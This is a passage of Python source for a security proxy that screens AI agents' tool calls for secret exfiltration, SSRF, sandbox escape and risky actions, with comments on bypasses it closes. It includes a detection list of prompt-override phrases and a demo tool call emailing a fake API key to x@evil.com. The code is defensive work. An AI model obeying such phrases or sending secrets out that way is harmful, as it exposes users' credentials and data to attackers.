    def seal(self) -> "ModelProxyPolicy":
        """Freeze the security-relevant configuration.

        The allowlists are ordinary mutable lists. Anything that can reach the policy object —
        a compromised in-process component, or a plugin handed the wrong reference — can simply
        append 'evil.io' to approved_outbound and permit its own exfiltration. Sealing converts
        those lists to tuples and records a fingerprint, so later tampering either raises or is
        detectable via `verify_seal()`. Call once after configuration, before serving.
        """
        self.approved_outbound = tuple(self.approved_outbound)
        self.approved_payees = tuple(self.approved_payees)
        self.allowed_commands = tuple(self.allowed_commands)
        self.trusted_local_reads = tuple(self.trusted_local_reads)
        self.approved_destructive_actions = tuple(tuple(x) for x in self.approved_destructive_actions)
        self.allowed_delete_paths = tuple(self.allowed_delete_paths)
        self.allowed_tools = tuple(self.allowed_tools)
        self.risky_tool_names = tuple(self.risky_tool_names)
        object.__setattr__(self, "_seal_fp", self._config_fingerprint())
        return self

    def _config_fingerprint(self) -> str:
        import hashlib
        blob = repr((tuple(self.approved_outbound), tuple(self.approved_payees),
                     tuple(self.allowed_commands), tuple(self.allowed_delete_paths), tuple(self.approved_destructive_actions), tuple(self.trusted_local_reads),
                     tuple(self.allowed_tools), tuple(self.risky_tool_names),
                     self.strict_deny_unknown, self.block_mode, self.block_generic_secrets,
                     self.track_session, self.deny_sensitive_egress,
                     tuple(self.taint_values), self.resolve_hosts, id(self.resolver),
                     None if self.egress_schemas is None else
                     (self.egress_schemas.strict_governed_only,
                      repr(self.egress_schemas._by_dest))))
        return hashlib.sha256(blob.encode()).hexdigest()

    def verify_seal(self) -> bool:
        """True if the configuration still matches what was sealed (tamper detection)."""
        fp = getattr(self, "_seal_fp", None)
        return fp is None or fp == self._config_fingerprint()

    def _schema_ok(self, name: str, args: Any) -> bool:
        """True when the outbound payload conforms to the schema declared for its destination
        (or the destination is not schema-governed). Sets _schema_reason for the verdict."""
        self._schema_reason = ""
        try:
            dest = self._destination(args)
            host = _host_of(dest) or dest
            payload = args
            if isinstance(args, dict):
                for k in ("body", "payload", "data", "content", "json"):
                    if k in args:
                        payload = args[k]
                        break
                if isinstance(payload, str):
                    try:
                        payload = json.loads(payload)
                    except Exception:
                        pass            # non-JSON body -> validated as a non-object (rejected)
            ok, reason, _sig = self.egress_schemas.check(host, name, payload)
            self._schema_reason = reason
            return bool(ok)
        except Exception as e:                       # fail CLOSED on schema-engine error
            self._schema_reason = f"schema check error: {e}"
            return False

    def _resolver(self):
        """The DNS resolver used for SSRF checks, or None to stay pure/no-I/O (default)."""
        if self.resolver is not None:
            return self.resolver
        return _default_resolver if self.resolve_hosts else None

    def _tool_granted(self, n: str) -> bool:
        """Strict-mode capability check: is this exact tool name explicitly granted?"""
        return n in {a.lower() for a in self.allowed_tools}

    def _payee_ok(self, dest: str) -> bool:
        """Funds destination allowlist: EXACT payee match only (no substring — so
        'acme-corp-evil' and 'x-acme-corp' are NOT approved)."""
        if not self.approved_payees:
            return False
        d = (dest or "").strip().lower()
        return bool(d) and any(d == p.strip().lower() for p in self.approved_payees)

    def _delete_path_ok(self, path: str) -> bool:
        """Destructive-path allowlist with traversal AND symlink defense.

        os.path.normpath is purely lexical: it resolves '..' but follows nothing. A symlink at
        /tmp/scratch/link -> /etc therefore stayed 'inside' the allowed prefix while pointing
        outside it, and the delete was approved. Both the candidate and the prefix are resolved
        with realpath so the check is about where the path actually LANDS.

        Residual TOCTOU is stated honestly: a symlink can be swapped between this check and the
        unlink. The executor should open O_NOFOLLOW / re-verify immediately before deleting.
        """
        if not self.allowed_delete_paths:
            return False
        raw = path or ""
        if not raw:
            return False
        try:
            norm = os.path.realpath(raw)
        except (OSError, ValueError):
            return False                       # cannot resolve -> cannot approve (fail-closed)
        for pref in self.allowed_delete_paths:
            try:
                p = os.path.realpath(str(pref))
            except (OSError, ValueError):
                continue
            if norm == p or norm.startswith(p + os.sep):
                # Also require the LEXICAL form to stay inside, so a prefix that is itself a
                # symlink cannot be used to widen the allowed set.
                lex = os.path.normpath(raw)
                lex_p = os.path.normpath(str(pref))
                if lex == lex_p or lex.startswith(lex_p + os.sep) or os.path.isabs(lex) is False:
                    return True
        return False

    # ---- classify one tool call ----
    def score_tool_call(self, name: str, args: Any) -> ProxyVerdict:
        from adom.enforcement.action_kernel import snapshot_args
        try:
            if type(name) is not str or not name or len(name) > 256:
                raise ValueError("invalid tool name")
            args = snapshot_args(args)
            return self._score_tool_call(name, args)
        except Exception:
            return ProxyVerdict(action="block", reason="action validation or policy failed",
                                signals=["action_kernel:fail_closed"])

    def _score_tool_call(self, name: str, args: Any) -> ProxyVerdict:
        v = ProxyVerdict()
        if self._observation_failed or self._taint_overflow:
            return ProxyVerdict(action="block", reason="read observation incomplete or secret tracking capacity exhausted",
                                signals=["observation:uncertain_fail_closed"])
        # SEAL CHECK ON THE DECISION PATH. seal() froze the security config and fingerprinted
        # it, and verify_seal() detects tampering — but nothing ever called it, so the
        # detection existed only in its own unit test. Anything able to reach this object could
        # append to approved_outbound and permit its own exfiltration, and the "tamper-evident"
        # property would never fire. Checking here costs one cached hash per decision.
        if not self.verify_seal():
            v.action = "block"
            v.signals.append("policy:seal_broken:config_tampered:critical")
            v.reason = ("ADOM policy configuration was modified after seal() — refusing to "
                        "decide against a tampered policy (fail-closed)")
            return v
        n = (name or "").lower()
        if isinstance(args, str):
            full_blob = args[:_MAX_FULL_SCAN]
        else:
            raw = []
            _collect_strings(args, raw)
            # JSON form (structure) + raw string values (real control chars / unicode preserved),
            # both bounded: json.dumps is guarded (circular refs) and the blob is length-capped.
            try:
                dumped = json.dumps(args or {}, default=str, ensure_ascii=False)
            except Exception:
                dumped = ""
            full_blob = (dumped + " \n " + " \n ".join(raw))[:_MAX_FULL_SCAN]
        # `blob` stays the bounded prefix for the cheap classifiers below (shape checks, escape
        # signatures, privesc) whose cost must stay flat. Secret scanning uses the windows.
        blob = full_blob[:_MAX_SCAN]

        is_outbound = name not in self.trusted_local_reads and (any(h in n for h in _OUTBOUND_TOOL_HINTS) or _looks_external(args, name))
        is_destructive = any(h in n for h in _DESTRUCTIVE_TOOL_HINTS)
        is_money = any(h in n for h in _MONEY_TOOL_HINTS)
        is_exec = any(h in n for h in _EXEC_TOOL_HINTS)
        is_named_risky = n in tuple(x.lower() for x in self.risky_tool_names)
        pii_out = _pii_hit(blob) if is_outbound else None   # structured PII leaving (computed once)

        # secret in the tool arguments -> critical (literal, encoded, or obfuscated).
        # Snapshot taints under the lock so concurrent note_read() can't mutate mid-scan.
        taints = self.all_taints()      # configured + learned; configured can never be evicted
        # Scan OVERLAPPING WINDOWS across the whole payload rather than only a prefix, so a
        # long benign preamble cannot push the secret out of view. Expensive deep checks run
        # on the first window only; cheap literal/encoded checks run across all windows.
        _windows = _scan_windows(full_blob)
        secret_hit = None
        for _i, _w in enumerate(_windows):
            secret_hit = _encoded_secret_hit(_w, taints, deep=(_i == 0))
            if secret_hit:
                break
        if not secret_hit and self.block_generic_secrets:
            for rx, label in _SECRET_RX:
                if any(rx.search(_w) for _w in _windows):
                    secret_hit = f"secret_pattern:{label}"
                    break
        # chunked exfil across calls: accumulate only CLEAN fragments (a call that already
        # hit directly is handled above and not banked, so it can't re-block later benign
        # outbound in the same session on stale content).
        if self.track_session and is_outbound and not secret_hit:
            # Two accumulators. The blob accumulator preserves encodings across calls; the
            # NORMALIZED PAYLOAD accumulator strips structure and the destination so fragments
            # of a split secret actually concatenate. Without the second one, "sk-live-" and
            # "DEADBEEF" sent in two calls never touch — the JSON braces, keys and URL sit
            # between them — so a chunked exfil to an APPROVED host went undetected.
            dest_val = self._destination(args)
            payload_only = [s for s in (raw if not isinstance(args, str) else [args])
                            if s and s != dest_val]
            frag = re.sub(r"[^A-Za-z0-9]", "", " ".join(payload_only)).lower()
            with self._lock:                        # atomic read-modify-write of the accumulators
                self._out_accum = (self._out_accum + " " + blob)[-4000:]
                if frag:
                    self._out_norm = (self._out_norm + frag)[-8000:]
                accum, accum_norm = self._out_accum, self._out_norm
            acc = _encoded_secret_hit(accum, taints, deep=False)
            if not acc and accum_norm:
                for val in taints:
                    nv = re.sub(r"[^A-Za-z0-9]", "", val or "").lower()
                    if len(nv) >= 10 and nv in accum_norm:
                        acc = "secret_reassembled_across_calls:critical"
                        break
            if acc:
                secret_hit = "chunked_" + acc

        escape = _escape_hit(blob)
        if secret_hit and (is_outbound or True):
            v.action = "block"
            v.signals.append(f"toolcall:exfil:{secret_hit}")
            v.reason = f"tool '{_safe_label(name)}' carries a secret in its arguments"
        elif escape:
            v.action = "block"
            v.signals.append(f"toolcall:sandbox_escape_attempt:{escape}:critical")
            v.reason = f"tool '{_safe_label(name)}' shows a sandbox-escape/privilege-escalation signature ({escape})"
        elif _privesc_hit(n, blob):
            v.action = "block"
            v.signals.append("toolcall:privilege_escalation:high")
            v.reason = f"tool '{_safe_label(name)}' expands authority (privilege escalation)"
        elif is_outbound and _ssrf_hit(self._destination(args) or blob, self._resolver()):
            v.action = "block"
            v.signals.append("toolcall:ssrf:internal_target:high")
            v.reason = f"tool '{_safe_label(name)}' targets an internal/metadata address (SSRF)"
        elif is_money:
            if self._payee_ok(self._destination(args)):
                v.action = "flag"; v.signals.append("toolcall:approved_payment")
            else:
                v.action = "block"; v.signals.append("toolcall:funds_transfer:high")
                v.reason = f"tool '{_safe_label(name)}' moves money to an unapproved payee"
        elif is_destructive:
            path = str((args or {}).get("path", "")) if isinstance(args, dict) else str(args)
            typed_ok = isinstance(args, dict) and any(name == tool and args.get(field) == value
                for tool, field, value in self.approved_destructive_actions)
            if typed_ok or self._delete_path_ok(path):
                v.action = "flag"; v.signals.append("toolcall:approved_delete")
            else:
                v.action = "block"; v.signals.append("toolcall:destructive:high")
                v.reason = f"tool '{_safe_label(name)}' is destructive (path not in allowed set)"
        elif is_exec:
            cmd = " ".join(str(x) for x in (args.values() if isinstance(args, dict) else [args]))
            if (self.allowed_commands and not _SHELL_META.search(cmd)
                    and any(re.search(p, cmd, re.I) for p in self.allowed_commands)):
                v.action = "flag"; v.signals.append("toolcall:approved_command")
            else:
                v.action = "block"; v.signals.append("toolcall:code_exec:high")
                v.reason = f"tool '{_safe_label(name)}' executes an unapproved command (or shell metachars)"
        elif is_named_risky:
            v.action = "block"; v.signals.append("toolcall:named_risky:high")
            v.reason = f"tool '{_safe_label(name)}' is on the risky list"
        elif is_outbound and self.egress_schemas is not None and not self._schema_ok(name, args):
            # Schema-enforced egress: the payload must match a declared structure with no
            # undeclared fields and no unconstrained free text. This removes the PLACE where a
            # cipher, a paraphrase, or prose-encoded PII could hide — the class of attack that
            # content inspection provably cannot enumerate.
            v.action = "block"
            v.signals.append("toolcall:egress_schema:violation:critical")
            v.reason = (f"tool '{_safe_label(name)}' payload does not conform to the declared "
                        f"egress schema ({self._schema_reason})")
        elif is_outbound and self.deny_sensitive_egress and self._sensitive_read:
            # A host grant authorizes connectivity, not disclosure of session data.
            # Deny even transformed/novel content: byte matching cannot establish
            # that output from a sensitive context is safe to release. This is a
            # conservative session boundary, not field-level declassification.
            v.action = "block"
            v.signals.append("toolcall:sensitive_context:release_required:critical")
            v.reason = (f"tool '{_safe_label(name)}' cannot send from a sensitive session; "
                        "an approved destination does not authorize data release")
        elif is_outbound and pii_out and (self._sensitive_read or not self._approved(self._destination(args))):
            # trusted-channel exfil (EchoLeak class): structured PII leaving after a sensitive
            # read, OR any structured PII to an unapproved host — blocked even to a trusted host.
            v.action = "block"
            v.signals.append(f"toolcall:pii_exfil:trusted_channel:{pii_out}:critical")
            v.reason = f"tool '{_safe_label(name)}' sends structured PII outbound (DLP: trusted-channel exfil)"
        elif is_outbound:
            dest = self._destination(args)
            if self.track_session and (self._sensitive_read or self._untrusted_input) and not self._approved(dest):
                # read-then-send: sensitive data OR untrusted/poisoned content was read, now an
                # outbound to an un-approved destination — block the exfil chain even if the
                # literal secret isn't in the payload (agent may summarize/attach, or a poisoned
                # instruction may redirect it to an attacker host).
                v.action = "block"
                v.signals.append("toolcall:exfil_chain:read_then_send:critical")
                v.reason = (f"tool '{_safe_label(name)}' sends data to an unapproved destination after "
                            f"sensitive or untrusted content was read")
            elif self.strict_deny_unknown and _network_dest(dest) and not self._approved(dest):
                # strict egress posture (high-assurance / gov): deny-by-default egress. A
                # non-approved network destination is blocked at the DESTINATION level —
                # immune to payload chunking, window-flooding, and novel encodings.
                v.action = "block"
                v.signals.append("toolcall:strict_egress:unapproved_destination:high")
                v.reason = f"tool '{_safe_label(name)}' egresses to an unapproved destination (strict egress)"
            else:
                v.action = "flag"; v.signals.append("toolcall:outbound:review")
                v.reason = f"tool '{_safe_label(name)}' sends data outbound"
        # ---- STRICT DENY-UNKNOWN (fail-CLOSED capability model) ----
        # Default posture is fail-open on novel tools. In strict mode, NOTHING runs unless
        # it is explicitly granted: the tool name is on allowed_tools, OR it already passed
        # through a configured approval allowlist (approved_payee / delete-path / command).
        # This closes the fail-open-on-unknown gap for high-assurance / autonomous deployments.
        if self.strict_deny_unknown and v.action in ("allow", "flag"):
            granted = self._tool_granted(n) or \
                any(s.startswith("toolcall:approved_") for s in v.signals)
            if not granted:
                v.action = "block"
                v.signals.append("toolcall:deny_unknown:strict")
                v.reason = (f"tool '{_safe_label(name)}' is not an explicitly granted capability "
                            f"(strict deny-unknown: fail-closed)")

        if v.action == "block" and not self.block_mode:
            # MONITOR-ONLY MODE. The call is NOT stripped — it proceeds to the executor. This
            # is a legitimate posture for shadow deployments, but it is indistinguishable from
            # enforcement in every downstream artifact unless it is labelled, so the verdict
            # carries an explicit marker and the reason says so in words.
            v.action = "flag"
            v.signals.append("policy:monitor_only:block_downgraded_to_flag")
            v.reason = (f"[MONITOR-ONLY: NOT BLOCKED, action will execute] "
                        f"{v.reason or 'would have been blocked'}")
            if not ModelProxyPolicy._monitor_mode_warned:
                ModelProxyPolicy._monitor_mode_warned = True
                import warnings
                warnings.warn(
                    "ADOM ModelProxyPolicy is running with block_mode=False: risky tool calls "
                    "are FLAGGED but still EXECUTE. This is monitor-only, not enforcement.",
                    RuntimeWarning, stacklevel=2)
        return v


# ---------- provider routing ----------
_UPSTREAM = {"openai": "api.openai.com", "anthropic": "api.anthropic.com",
             "gemini": "generativelanguage.googleapis.com"}

# Every provider `detect_provider` can return. A provider that is ROUTABLE but not PARSEABLE is
# the worst failure mode this proxy has: the response is forwarded uninspected while the headers
# report it as inspected and allowed. The registry assertions below (and the matching one in
# stream_inspect) make that state impossible to ship — the process refuses to import instead.
SUPPORTED_PROVIDERS = ("openai", "anthropic", "gemini")
_RESPONSE_PARSERS = {"openai", "anthropic", "gemini"}


def _normalize_api_path(path: str) -> str:
    """Canonicalize a request path before provider matching.

    Matching on the raw path let '//v1/chat/completions' return None, which routed the request
    to the default upstream UNINSPECTED while the response was stamped 'not inspected' — a
    bypass costing one extra slash. Upstreams normalize these forms, so ADOM must too.
    """
    p = (path or "").split("?", 1)[0].split("#", 1)[0]
    if not p.startswith("/"):
        p = "/" + p
    while "//" in p:
        p = p.replace("//", "/")
    if len(p) > 1:
        p = p.rstrip("/") or "/"
    return p


def detect_provider(path: str) -> Optional[str]:
    p = _normalize_api_path(path)
    low = p.lower()
    if low.startswith("/v1/messages"):
        return "anthropic"
    if "generatecontent" in low or low.startswith("/v1beta/"):
        return "gemini"
    if low.startswith("/v1/chat/completions") or low.startswith("/v1/responses") \
       or low.startswith("/v1/completions"):
        return "openai"
    return None


def upstream_host(provider: str) -> Optional[str]:
    return _UPSTREAM.get(provider)


# ---------- response inspection + safe rewrite ----------
def _openai_tool_calls(msg: Dict) -> List[Tuple[str, Any]]:
    out = []
    for tc in (msg.get("tool_calls") or []):
        fn = tc.get("function") or {}
        name = fn.get("name", "")
        raw = fn.get("arguments", "")
        try:
            args = json.loads(raw) if isinstance(raw, str) and raw.strip() else raw
        except Exception:
            args = raw
        out.append((name, args))
    return out


def _openai_responses_items(resp: Dict) -> List[Tuple[int, Dict, str, Any]]:
    """Tool calls in the OpenAI RESPONSES API shape (/v1/responses).

    This surface returns `output[]` with `{"type": "function_call", ...}` — NOT `choices[]`.
    It is the default surface for new agent integrations, so a proxy that only understands
    chat-completions silently forwards every tool call it makes.
    """
    out = []
    for i, item in enumerate(resp.get("output") or []):
        if not isinstance(item, dict):
            continue
        if item.get("type") in ("function_call", "custom_tool_call", "tool_call"):
            raw = item.get("arguments", item.get("input", ""))
            try:
                args = json.loads(raw) if isinstance(raw, str) and raw.strip() else raw
            except Exception:
                args = raw
            out.append((i, item, item.get("name", ""), args))
    return out


def inspect_response(provider: str, resp: Dict, policy: ModelProxyPolicy
                     ) -> Tuple[ProxyVerdict, Dict]:
    """Return (verdict, possibly-rewritten response)."""
    verdict = ProxyVerdict()
    if not isinstance(resp, dict):
        return verdict, resp

    if provider == "openai":
        # --- Responses API (/v1/responses): output[] with function_call items ---
        items = _openai_responses_items(resp)
        if items:
            risky_idx, risky = set(), []
            for idx, _item, name, args in items:
                v = policy.score_tool_call(name, args)
                if v.action != "allow":
                    verdict.signals += v.signals
                if v.action == "block":
                    risky_idx.add(idx)
                    risky.append((name, v.reason))
                    verdict.blocked_tools.append(name)
            if risky:
                verdict.action = "block"
                reasons = "; ".join(r for _, r in risky)
                kept = [it for i, it in enumerate(resp.get("output") or [])
                        if i not in risky_idx]
                kept.append({"type": "message", "role": "assistant", "content": [
                    {"type": "output_text",
                     "text": f"[ADOM blocked {len(risky)} tool call(s): {reasons}. Not executed.]"}]})
                resp["output"] = kept
                resp["status"] = "completed"
            elif verdict.signals:
                verdict.action = "flag"

        for choice in resp.get("choices") or []:
            msg = choice.get("message") or {}
            risky = []
            for name, args in _openai_tool_calls(msg):
                v = policy.score_tool_call(name, args)
                if v.action != "allow":
                    verdict.signals += v.signals
                    if v.action == "block":
                        risky.append((name, v.reason))
                        verdict.blocked_tools.append(name)
            if risky:
                verdict.action = "block"
                reasons = "; ".join(r for _, r in risky)
                msg["tool_calls"] = []
                msg["content"] = (msg.get("content") or "") + \
                    f"[ADOM blocked {len(risky)} tool call(s): {reasons}. Not executed.]"
                choice["finish_reason"] = "stop"
            elif verdict.action == "allow" and verdict.signals:
                verdict.action = "flag"

    elif provider == "anthropic":
        blocks = resp.get("content") or []
        risky = []
        kept = []
        for b in blocks:
            if isinstance(b, dict) and b.get("type") == "tool_use":
                v = policy.score_tool_call(b.get("name", ""), b.get("input"))
                if v.action == "block":
                    verdict.signals += v.signals
                    risky.append((b.get("name", ""), v.reason))
                    verdict.blocked_tools.append(b.get("name", ""))
                    continue  # drop the tool_use block
                elif v.action == "flag":
                    verdict.signals += v.signals
            kept.append(b)
        if risky:
            verdict.action = "block"
            reasons = "; ".join(r for _, r in risky)
            kept.append({"type": "text",
                         "text": f"[ADOM blocked {len(risky)} tool call(s): {reasons}. Not executed.]"})
            resp["content"] = kept
            resp["stop_reason"] = "end_turn"
        elif verdict.signals:
            verdict.action = "flag"

    elif provider == "gemini":
        risky_all = []
        for cand in resp.get("candidates") or []:
            content = cand.get("content") or {}
            parts = content.get("parts") or []
            kept = []
            for p in parts:
                fc = p.get("functionCall") if isinstance(p, dict) else None
                if fc:
                    v = policy.score_tool_call(fc.get("name", ""), fc.get("args"))
                    if v.action == "block":
                        verdict.signals += v.signals
                        risky_all.append((fc.get("name", ""), v.reason))
                        verdict.blocked_tools.append(fc.get("name", ""))
                        continue        # drop the functionCall part
                    elif v.action == "flag":
                        verdict.signals += v.signals
                kept.append(p)
            if len(kept) != len(parts):
                kept.append({"text": "[ADOM blocked a tool call. Not executed.]"})
                content["parts"] = kept
        if risky_all:
            verdict.action = "block"
        elif verdict.signals:
            verdict.action = "flag"

    if verdict.action == "block":
        verdict.reason = "risky tool call(s) stripped before execution"
    return verdict, resp


# Fail at IMPORT if a routable provider has no response parser.
_missing_resp = set(SUPPORTED_PROVIDERS) - _RESPONSE_PARSERS
if _missing_resp:                                              # pragma: no cover
    raise RuntimeError(
        f"ADOM provider registry incomplete: {sorted(_missing_resp)} are routable via "
        f"detect_provider() but have no response parser. A routable-but-unparseable provider "
        f"is forwarded uninspected while reporting 'inspected'. Refusing to start.")


# ---------- request inspection (light, flag-only by default) ----------
def inspect_request(provider: str, req: Dict, policy: ModelProxyPolicy) -> ProxyVerdict:
    v = ProxyVerdict()
    try:
        text = json.dumps(req.get("messages") or req.get("input") or "", default=str)
    except Exception:
        return v
    low = text.lower()
    for pat in ("ignore your", "ignore all previous", "disregard the above",
                "developer mode", "you are now", "exfiltrate", "leak the"):
        if pat in low:
            v.action = "flag"; v.signals.append("request:possible_injection")
            break
    return v


# ---------- live reverse proxy (forwards to the real upstream) ----------
def make_proxy_handler(policy: ModelProxyPolicy,
                       on_decision: Optional[Callable[[str, ProxyVerdict], None]] = None):

    class _H(BaseHTTPRequestHandler):
        protocol_version = "HTTP/1.1"

        def log_message(self, *a):
            pass

        def _send(self, status: int, headers, body: bytes, extra: Optional[Dict] = None):
            self.send_response(status)
            skip = ("content-length", "transfer-encoding", "connection",
                    "content-encoding", "keep-alive")
            for k, v in headers:
                if k.lower() in skip:
                    continue
                self.send_header(k, v)
            for k, v in (extra or {}).items():
                self.send_header(k, v)
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def _handle(self):
            path = self.path
            provider = detect_provider(path)
            up = upstream_host(provider) if provider else \
                os.getenv("ADOM_DEFAULT_UPSTREAM", "api.openai.com")

            n = int(self.headers.get("Content-Length", 0) or 0)
            raw = self.rfile.read(n) if n else b""

            fwd = {}
            for k, v in self.headers.items():
                if k.lower() in ("host", "content-length", "proxy-connection",
                                 "connection", "accept-encoding"):
                    continue
                fwd[k] = v
            fwd["Host"] = up
            fwd["Accept-Encoding"] = "identity"      # force uncompressed so we can parse JSON

            req_json = None
            try:
                req_json = json.loads(raw) if raw else None
            except Exception:
                req_json = None
            streaming = bool(isinstance(req_json, dict) and req_json.get("stream"))
            if isinstance(req_json, dict):
                rv = inspect_request(provider or "openai", req_json, policy)
                if rv.signals and on_decision:
                    on_decision("request", rv)

            try:
                conn = http.client.HTTPSConnection(up, timeout=90)
                conn.request(self.command, path, body=raw or None, headers=fwd)
                resp = conn.getresponse()
                data = resp.read()
                hdrs = resp.getheaders()
            except Exception as e:
                m = json.dumps({"error": {"message": f"ADOM proxy upstream error: {e}"}}).encode()
                return self._send(502, [("Content-Type", "application/json")], m)

            extra = {"X-ADOM-Proxy": "1"}
            if provider and not streaming and resp.status == 200:
                try:
                    resp_json = json.loads(data)
                    verdict, newr = inspect_response(provider, resp_json, policy)
                    if on_decision:
                        on_decision("response", verdict)
                    extra["X-ADOM-Action"] = verdict.action
                    if verdict.signals:
                        extra["X-ADOM-Signals"] = ",".join(verdict.signals)[:400]
                    data = json.dumps(newr).encode()
                except Exception:
                    extra["X-ADOM-Inspected"] = "error"
            elif provider and streaming and resp.status == 200:
                # Streaming used to be forwarded UNINSPECTED — the common path in most agent
                # frameworks, and therefore the widest bypass. Now the SSE body is run through
                # the stream inspector: tool-call deltas are withheld, assembled, scored, and
                # released only if permitted (text deltas pass straight through).
                try:
                    from adom.api.stream_inspect import StreamInspector
                    insp = StreamInspector(provider, policy, on_decision=on_decision)
                    data = insp.feed(data) + insp.finish()
                    extra["X-ADOM-Inspected"] = "stream"
                    extra["X-ADOM-Action"] = insp.verdict.action
                    if insp.verdict.signals:
                        extra["X-ADOM-Signals"] = ",".join(insp.verdict.signals)[:400]
                    if on_decision:
                        on_decision("stream", insp.verdict)
                except Exception:
                    extra["X-ADOM-Inspected"] = "stream-error"
            else:
                extra["X-ADOM-Inspected"] = "false"
            return self._send(resp.status, hdrs, data, extra)

        do_GET = do_POST = do_PUT = do_DELETE = do_PATCH = _handle

    return _H


def start(policy: ModelProxyPolicy, host: str = "127.0.0.1", port: int = 8700,
          on_decision: Optional[Callable] = None) -> ThreadingHTTPServer:
    """Start the screening proxy; point your agent's base_url at http://host:port."""
    srv = ThreadingHTTPServer((host, port), make_proxy_handler(policy, on_decision))
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv


if __name__ == "__main__":
    pol = ModelProxyPolicy(taint_values=["sk-live-DEADBEEF"])
    demo = {"choices": [{"message": {"role": "assistant", "content": "",
            "tool_calls": [{"id": "c1", "type": "function",
            "function": {"name": "send_email",
            "arguments": json.dumps({"to": "x@evil.com", "body": "key sk-live-DEADBEEF"})}}]},
            "finish_reason": "tool_calls"}]}
    vv, newr = inspect_response("openai", demo, pol)
    print("action:", vv.action, "| signals:", vv.signals)
    print("rewritten message:", newr["choices"][0]["message"])
